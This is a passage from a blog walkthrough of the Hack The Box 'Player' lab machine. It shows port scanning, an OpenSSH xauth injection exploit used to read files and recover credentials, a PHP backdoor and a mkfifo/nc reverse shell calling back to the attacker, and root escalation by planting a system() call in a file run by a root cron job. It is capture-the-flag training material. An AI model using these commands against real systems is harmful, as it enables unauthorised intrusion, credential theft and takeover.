<br><br>I tried these credentials with <code class="highlighter-rouge">ssh</code> and with <code class="highlighter-rouge">dev.player.htb</code> and they didn’t work. I ran a quick full port scan with <code class="highlighter-rouge">masscan</code> and turns out that there was another open port:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# masscan -p1-65535 10.10.10.145 --rate=1000 -e tun0

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-01-18 00:09:24 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 22/tcp on 10.10.10.145                                    
Discovered open port 80/tcp on 10.10.10.145                                    
Discovered open port 6686/tcp on 10.10.10.145
</code></pre></div></div>
<p><br>I scanned that port with <code class="highlighter-rouge">nmap</code> but it couldn’t identify the service:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE    VERSION
6686/tcp open  tcpwrapped
</code></pre></div></div>
<p><br>However when I connected to the port with <code class="highlighter-rouge">nc</code> the banner indicated that it was an <code class="highlighter-rouge">ssh</code> server:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nc player.htb 6686
SSH-2.0-OpenSSH_7.2

Protocol mismatch.
root@kali:~/Desktop/HTB/boxes/player#
</code></pre></div></div>
<p><br>I could login to that <code class="highlighter-rouge">ssh</code> server with the credentials, but unfortunately I was in a restricted environment:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# ssh telegen@player.htb -p 6686
The authenticity of host '[player.htb]:6686 ([10.10.10.145]:6686)' can't be established.
ECDSA key fingerprint is SHA256:oAcCXvit3SHvyq7nuvWntLq+Q+mGlAg8301zhKnJmPM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[player.htb]:6686,[10.10.10.145]:6686' (ECDSA) to the list of known hosts.
telegen@player.htb's password: 
Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104
Environment:
  USER=telegen
  LOGNAME=telegen
  HOME=/home/telegen
  PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
  MAIL=/var/mail/telegen
  SHELL=/usr/bin/lshell
  SSH_CLIENT=10.10.xx.xx 43270 6686
  SSH_CONNECTION=10.10.xx.xx 43270 10.10.10.145 6686
  SSH_TTY=/dev/pts/4
  TERM=screen
========= PlayBuff ==========
Welcome to Staging Environment

telegen:~$ whoami
*** forbidden command: whoami
telegen:~$ help
  clear  exit  help  history  lpath  lsudo
telegen:~$ lsudo
Allowed sudo commands:
telegen:~$ lpath
Allowed:
 /home/telegen
telegen:~$ pwd
*** forbidden command: pwd
telegen:~$ 
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="openssh-72p1-xauth-command-injection--user-flag">OpenSSH 7.2p1 xauth Command Injection –&gt; User Flag</h2>
<p><br>When I searched for exploits for that version of <code class="highlighter-rouge">openssh</code> I found this <a href="https://www.exploit-db.com/exploits/39569" target="_blank" rel="noopener noreferrer">exploit</a>.</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# python 39569.py 
 Usage: &lt;host&gt; &lt;port&gt; &lt;username&gt; &lt;password or path_to_privkey&gt;
        
        path_to_privkey - path to private key in pem format, or '.demoprivkey' to use demo private key
        

root@kali:~/Desktop/HTB/boxes/player# python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
INFO:__main__:connecting to: telegen:d-bC|jC!2uepS/w@player.htb:6686
INFO:__main__:connected!
INFO:__main__:
Available commands:
    .info
    .readfile &lt;path&gt;
    .writefile &lt;path&gt; &lt;data&gt;
    .exit .quit
    &lt;any xauth command or type help&gt;

#&gt; .readfile /etc/passwd
DEBUG:__main__:auth_cookie: 'xxxx\nsource /etc/passwd\n'
DEBUG:__main__:dummy exec returned: None
INFO:__main__:root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
telegen:x:1000:1000:telegen,,,:/home/telegen:/usr/bin/lshell
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:105:113:MySQL
colord:x:106:116:colord
staged-dev:x:4000000000:1001::/home/staged-dev:/bin/sh
#&gt; 
</code></pre></div></div>
<p><br>I tried to use <code class="highlighter-rouge">.writefile</code> to write a <code class="highlighter-rouge">php</code> file and get a reverse shell but I couldn’t do that. But anyway I was finally able to read the user flag:<br>
<img src="/images/hackthebox/player/19.png" alt="">
<br></p>
<hr>

<h2 id="credentials-in-fixphp--rce--shell-as-www-data">Credentials in fix.php –&gt; RCE –&gt; Shell as www-data</h2>
<p><br>Earlier I couldn’t read <code class="highlighter-rouge">fix.php</code> through the <code class="highlighter-rouge">ffmpeg</code> exploit, I was able to read it as <code class="highlighter-rouge">telegen</code> and I found credentials for a user called <code class="highlighter-rouge">peter</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#&gt; .readfile /var/www/staging/fix.php                                    
DEBUG:__main__:auth_cookie: 'xxxx\nsource /var/www/staging/fix.php\n'          
DEBUG:__main__:dummy exec returned: None
INFO:__main__:&lt;?php       
class                            
protected                                          
protected                                      
protected                                      
public                                       
return                                          
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
if($result
static::failed($test_name);
}
static::passed($test_name);
}
}
public
if(!$username){
$username
$password
}
//modified
//for
//fix
//peter
//CQXpm\z)G5D#%S$y=
}
public
if($result
static::passed($test_name);
}
static::failed($test_name);
}
}
public
echo
echo
echo
}
private
echo
static::$failed++;
}
private
static::character(".");
static::$passed++;
}
private
echo
static::$last_echoed
}
private
if(static::$last_echoed
echo
static::$last_echoed
}
}
#&gt; 
</code></pre></div></div>
<p><br>These credentials (<code class="highlighter-rouge">peter : CQXpm\z)G5D#%S$y=</code>) worked with <code class="highlighter-rouge">dev.player.htb</code>:<br>
<img src="/images/hackthebox/player/20.png" alt="">
<br><br>
<img src="/images/hackthebox/player/21.png" alt="">
<br><br>
I tried to create a new project in <code class="highlighter-rouge">/var/www/html</code>:<br>
<img src="/images/hackthebox/player/22.png" alt="">
<br><br>But I got an error saying that I was only allowed to create projects in <code class="highlighter-rouge">/var/www/demo/home</code> so I created a project there:<br>
<img src="/images/hackthebox/player/23.png" alt="">
<br><br>When I ran <code class="highlighter-rouge">gobuster</code> on <code class="highlighter-rouge">http://dev.player.htb/</code> there was a directory called <code class="highlighter-rouge">home</code>:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# gobuster dir -u http://dev.player.htb/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://dev.player.htb/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/17 20:18:00 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/components (Status: 301)
/data (Status: 301)
/favicon.ico (Status: 200)
/home (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/languages (Status: 301)
/lib (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/themes (Status: 301)
===============================================================
2020/01/17 20:19:49 Finished
===============================================================
root@kali:~/Desktop/HTB/boxes/player# 
</code></pre></div></div>
<p><br>I wanted to see if that was related to <code class="highlighter-rouge">/var/www/demo/home</code> so I created a file called <code class="highlighter-rouge">test.php</code> that echoed <code class="highlighter-rouge">test</code> and I tried to access it through <code class="highlighter-rouge">/home</code>:<br>
<img src="/images/hackthebox/player/24.png" alt="">
<br><br>
<img src="/images/hackthebox/player/25.png" alt="">
<br><br>It worked so I edited my test file and added the <code class="highlighter-rouge">php-simple-backdoor</code> code and got a reverse shell:<br>
<img src="/images/hackthebox/player/26.png" alt="">
<br><br>
<img src="/images/hackthebox/player/27.png" alt="">
<br><br></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.145] 56714
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c "import pty;pty.spawn('/bin/bash')"
www-data@player:/var/www/demo/home$ ^Z
[1]+  Stopped                 nc -lvnp 1337
root@kali:~/Desktop/HTB/boxes/player# stty raw -echo
root@kali:~/Desktop/HTB/boxes/player# nc -lvnp 1337

www-data@player:/var/www/demo/home$ export TERM=screen
www-data@player:/var/www/demo/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@player:/var/www/demo/home$ 
</code></pre></div></div>
<p><br></p>
<hr>

<h2 id="root-flag">Root Flag</h2>
<p><br>when I ran <code class="highlighter-rouge">pspy</code> to monitor the processes I noticed that <code class="highlighter-rouge">/var/lib/playbuff/buff.php</code> got executed as root periodically:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2020/01/18 05:25:02 CMD: UID=0    PID=3650   | /usr/bin/php /var/lib/playbuff/buff.php 
</code></pre></div></div>
<p><br>I couldn’t write to it but it included another <code class="highlighter-rouge">php</code> file which I could write to (<code class="highlighter-rouge">/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code>):</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">player</span><span class="o">:/</span><span class="nx">tmp</span><span class="err">$</span> <span class="nx">cd</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">playbuff</span><span class="o">/</span>
<span class="nx">www</span><span class="o">-</span><span class="nx">data</span><span class="o">@</span><span class="nx">player</span><span class="o">:/</span><span class="k">var</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">playbuff</span><span class="err">$</span> <span class="nx">cat</span> <span class="nx">buff</span><span class="o">.</span><span class="nx">php</span> 
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php"</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">playBuff</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="nv">$logFile</span><span class="o">=</span><span class="s2">"/var/log/playbuff/logs.txt"</span><span class="p">;</span>
        <span class="k">public</span> <span class="nv">$logData</span><span class="o">=</span><span class="s2">"Updated"</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">function</span> <span class="nf">__wakeup</span><span class="p">()</span>
        <span class="p">{</span>
                <span class="nb">file_put_contents</span><span class="p">(</span><span class="nx">__DIR__</span><span class="o">.</span><span class="s2">"/"</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logData</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$buff</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">playBuff</span><span class="p">();</span>
<span class="nv">$serialbuff</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$buff</span><span class="p">);</span>
<span class="nv">$data</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">);</span>
<span class="k">if</span><span class="p">(</span><span class="nb">unserialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span>
<span class="p">{</span>
        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
        <span class="nv">$query</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'Update Success with serialized logs!'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/merge.log"</span><span class="p">,</span><span class="s2">"no issues yet"</span><span class="p">);</span>
        <span class="nv">$update</span> <span class="o">=</span> <span class="nb">file_get_contents</span><span class="p">(</span><span class="s2">"/var/lib/playbuff/logs.txt"</span><span class="p">);</span>
        <span class="nv">$query</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="s2">"update stats set status='</span><span class="nv">$update</span><span class="s2">' where id=1"</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span>
        <span class="p">{</span>
                <span class="k">echo</span> <span class="s1">'Update Success!'</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
www-data@player:/var/lib/playbuff$ 
</code></pre></div></div>
<p><br>I put my reverse shell payload in <code class="highlighter-rouge">/tmp</code> and added a line to <code class="highlighter-rouge">/var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php</code> that executed it:</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@player:/$ cat /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
&lt;?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "integrity";

system("bash -c /tmp/pwned.sh");

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn-&gt;connect_error) {
    die("Connection failed: " . $conn-&gt;connect_error);
}
?&gt;
www-data@player:/$ cat /tmp/pwned.sh 
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.xx.xx 1338 &gt;/tmp/f
www-data@player:/$ 
</code></pre></div></div>
<p><br>
<img src="/images/hackthebox/player/28.png" alt="">
<br><br>And we owned root !
<br>That’s it , Feedback is appreciated !
<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener noreferrer">@Ahm3d_H3sham</a>
<br>Thanks for reading.
<br>
<br>
<br>Previous Hack The Box write-up : <a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></p>
<hr>


</div>





<div class="related">
  <h2>other posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/hack-the-box/bitlab/">
            Hack The Box - Bitlab
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/craft/">
            Hack The Box - Craft
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/hack-the-box/smasher2/">
            Hack The Box - Smasher2
          </a>
        </h3>
      </li>
    
  </ul>
</div>




  
  <h2>All Tags</h2>
  <div class="tag-cloud">
<a href="/tag/active-directory/" class="set-1">active-directory</a> <a href="/tag/binary-exploitation/" class="set-2">binary-exploitation</a> <a href="/tag/blockchain/" class="set-1">blockchain</a> <a href="/tag/bsd/" class="set-1">bsd</a> <a href="/tag/buffer-overflow/" class="set-2">buffer-overflow</a> <a href="/tag/c/" class="set-2">c</a> <a href="/tag/code-analysis/" class="set-2">code-analysis</a> <a href="/tag/cryptography/" class="set-1">cryptography</a> <a href="/tag/drupal/" class="set-1">drupal</a> <a href="/tag/egghunting/" class="set-1">egghunting</a> <a href="/tag/elasticsearch/" class="set-1">elasticsearch</a> <a href="/tag/exploit-development/" class="set-2">exploit-development</a> <a href="/tag/firewall/" class="set-1">firewall</a> <a href="/tag/forensics/" class="set-1">forensics</a> <a href="/tag/ftp/" class="set-1">ftp</a> <a href="/tag/git/" class="set-1">git</a> <a href="/tag/javascript/" class="set-1">javascript</a> <a href="/tag/joomla/" class="set-1">joomla</a> <a href="/tag/js/" class="set-1">js</a> <a href="/tag/jwt/" class="set-1">jwt</a> <a href="/tag/kernel-exploitation/" class="set-1">kernel-exploitation</a> <a href="/tag/kibana/" class="set-1">kibana</a> <a href="/tag/latex-injection/" class="set-1">latex-injection</a> <a href="/tag/ldap/" class="set-1">ldap</a> <a href="/tag/lfi/" class="set-1">lfi</a> <a href="/tag/linux/" class="set-5">linux</a> <a href="/tag/logstash/" class="set-1">logstash</a> <a href="/tag/mmap/" class="set-1">mmap</a> <a href="/tag/networking/" class="set-2">networking</a> <a href="/tag/php/" class="set-2">php</a> <a href="/tag/pivoting/" class="set-1">pivoting</a> <a href="/tag/postgresql/" class="set-1">postgresql</a> <a href="/tag/python/" class="set-3">python</a> <a href="/tag/rbash/" class="set-1">rbash</a> <a href="/tag/rce/" class="set-4">rce</a> <a href="/tag/reverse-engineering/" class="set-1">reverse-engineering</a> <a href="/tag/smart-contracts/" class="set-1">smart-contracts</a> <a href="/tag/smb/" class="set-2">smb</a> <a href="/tag/snmp/" class="set-1">snmp</a> <a href="/tag/solidity/" class="set-1">solidity</a> <a href="/tag/sqli/" class="set-1">sqli</a> <a href="/tag/ssh/" class="set-3">ssh</a> <a href="/tag/ssti/" class="set-1">ssti</a> <a href="/tag/steganography/" class="set-1">steganography</a> <a href="/tag/sudo/" class="set-1">sudo</a> <a href="/tag/suid/" class="set-1">suid</a> <a href="/tag/waf/" class="set-1">waf</a> <a href="/tag/web/" class="set-5">web</a> <a href="/tag/windows/" class="set-2">windows</a> <a href="/tag/windows-exploitation/" class="set-1">windows-exploitation</a> <a href="/tag/winrm/" class="set-1">winrm</a> <a href="/tag/wordpress/" class="set-1">wordpress</a>
</div>
  



      </div>
    </main><footer class="site-footer">
	<center> <script src="https://www.hackthebox.eu/badge/65598"></script> </center>
  <div class="wrapper">
<div class="toggleWrapper">
    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked>
    <label for="theme-toggle" class="toggle">
    <span class="toggle__handler">
      <span class="crater crater--1"></span>
      <span class="crater crater--2"></span>
      <span class="crater crater--3"></span>
    </span>
        <span class="star star--1"></span>
        <span class="star star--2"></span>
        <span class="star star--3"></span>
        <span class="star star--4"></span>
        <span class="star star--5"></span>
        <span class="star star--6"></span>
    </label>
</div>
<script type="text/javascript">
if (localStorage.getItem("theme") === null) {
    window.localStorage.setItem('theme', 'dark');
}
const theme = localStorage.getItem('theme');
if (theme === "dark") {
	document.documentElement.setAttribute('data-theme', 'dark');
}
const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');

if (theme === "dark") {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'dark');
    document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	document.getElementById("theme-toggle").className = 'light';
} else if (theme === "light") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'light');
    document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	document.getElementById("theme-toggle").className = 'dark';
} else if  (userPrefers === "dark") {
    document.getElementById('theme-toggle').checked = false;
    document.documentElement.setAttribute('data-theme', 'dark');
	document.documentElement.classList.add('theme--dark');
    document.documentElement.classList.remove('theme--light');
	window.localStorage.setItem('theme', 'dark');
	document.getElementById("theme-toggle").className = 'light';
} else {
    document.getElementById('theme-toggle').checked = true;
    document.documentElement.setAttribute('data-theme', 'light');
	document.documentElement.classList.add('theme--light');
    document.documentElement.classList.remove('theme--dark');
	window.localStorage.setItem('theme', 'light');
	document.getElementById("theme-toggle").className = 'dark';
}

function modeSwitcher() {
	let currentMode = document.documentElement.getAttribute('data-theme');
	if (currentMode === "dark") {
	    document.documentElement.setAttribute('data-theme', 'light');
		document.documentElement.classList.add('theme--light');
        document.documentElement.classList.remove('theme--dark');
		window.localStorage.setItem('theme', 'light');
	    document.getElementById("theme-toggle").className = 'dark';
	} else {
	    document.documentElement.setAttribute('data-theme', 'dark');
		document.documentElement.classList.add('theme--dark');
        document.documentElement.classList.remove('theme--light');
		window.localStorage.setItem('theme', 'dark');
	    document.getElementById("theme-toggle").className = 'light';
	}
}
</script>
</div>
  
</footer>


<script>
      window.FontAwesomeConfig = {
        searchPseudoElements: true
      }
    </script>
  </body>

</html>
